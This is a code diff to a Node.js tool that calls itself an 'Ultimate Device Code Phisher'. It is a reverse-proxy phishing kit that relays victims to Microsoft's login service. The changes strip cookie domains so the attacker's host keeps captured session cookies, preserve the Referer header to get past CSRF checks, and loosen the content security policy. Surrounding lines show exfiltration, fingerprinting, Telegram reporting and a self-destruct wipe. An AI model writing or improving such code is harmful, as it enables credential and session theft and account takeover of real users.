@@ -1,7 +1,7 @@
+\// ============================================================
+// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.10 – Cookie Domain Stripped
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.8 – Preflight Fix
-// ============================================================
-// Fixed GetCredentialType 500 error by handling OPTIONS locally.
+// Strips Domain= from Set-Cookie headers to avoid browser warnings.
 // ============================================================
 
 const http = require('http');
@@ -155,6 +155,17 @@ function createAxiosConfig() {
     const config = { timeout: 10000 };
     if (proxyAgent) config.httpsAgent = proxyAgent;
     return config;
+}
+
+// ── Cookie Domain Stripper ──
+function stripCookieDomain(headers) {
+    const setCookie = headers['set-cookie'];
+    if (!setCookie) return;
+    const newCookies = (Array.isArray(setCookie) ? setCookie : [setCookie]).map(cookie => {
+        // Remove Domain=...; part (case‑insensitive)
+        return cookie.replace(/;\s*Domain=[^;]*(;|$)/gi, '');
+    });
+    headers['set-cookie'] = newCookies;
 }
 
 // ── Exfiltrate ──
@@ -652,7 +663,7 @@ app.post('/device/fingerprint', (req, res) => {
 
 // ── SECOND-STAGE PHISHING: CRASH‑PROOF REVERSE PROXY ──
 app.all('/login*', async (req, res) => {
-    // 🔥 FIX: Handle OPTIONS preflight requests locally to avoid 500 from Microsoft
+    // 🔥 Handle OPTIONS preflight requests locally to avoid 500 from Microsoft
     if (req.method === 'OPTIONS') {
         res.setHeader('Access-Control-Allow-Origin', '*');
         res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
@@ -677,13 +688,13 @@ app.all('/login*', async (req, res) => {
     }
     const targetUrl = targetBase + targetPath;
 
-    // 🔥 STRIP PROBLEMATIC HEADERS
+    // 🔥 STRIP PROBLEMATIC HEADERS BUT PRESERVE REFERER
     const headers = { ...req.headers };
     delete headers.host;
     delete headers['content-length'];
     delete headers['transfer-encoding'];
     delete headers['origin'];       // Prevent Microsoft API 500 errors
-    delete headers['referer'];      // Prevent API confusion
+    // DO NOT delete referer. Microsoft's API requires it for CSRF protection.
     headers['Host'] = 'login.microsoftonline.com';
 
     let bodyData = null;
@@ -852,6 +863,9 @@ app.all('/login*', async (req, res) => {
         // Remove any CSP from Microsoft to avoid conflicts
         delete responseHeaders['content-security-policy'];
         delete responseHeaders['content-security-policy-report-only'];
+
+        // 🔥 Strip Domain from Set-Cookie headers
+        stripCookieDomain(responseHeaders);
 
         res.set(responseHeaders);
         res.setHeader('Content-Security-Policy', "default-src *; script-src * 'unsafe-inline' 'unsafe-eval'; style-src * 'unsafe-inline'; img-src * data:; connect-src *;");
@@ -1081,7 +1095,7 @@ server.on('upgrade', (req, socket, head) => {
     if (req.url === '/ws') { wsServer.handleUpgrade(req, socket, head, (ws) => { wsServer.emit('connection', ws, req); }); } else { socket.destroy(); }
 });
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v5.4.8 – Preflight Fix running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v5.4.10 – Cookie Domain Stripped running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
@@ -1089,7 +1103,7 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`📁 Campaigns: active`);
     console.log(`📧 Forward Email: ${FORWARD_EMAIL || 'DISABLED'}`);
     console.log(`💣 Self-Destruct: ${AUTO_WIPE_HOURS > 0 ? `after ${AUTO_WIPE_HOURS} hrs inactive` : 'DISABLED'}`);
-    console.log(`🚀 Full reverse-proxy with Preflight handled locally: ACTIVE`);
+    console.log(`🚀 Full reverse-proxy with cookie domain stripping: ACTIVE`);
 });
 
 process.on('SIGTERM', () => server.close(() => process.exit(0)));
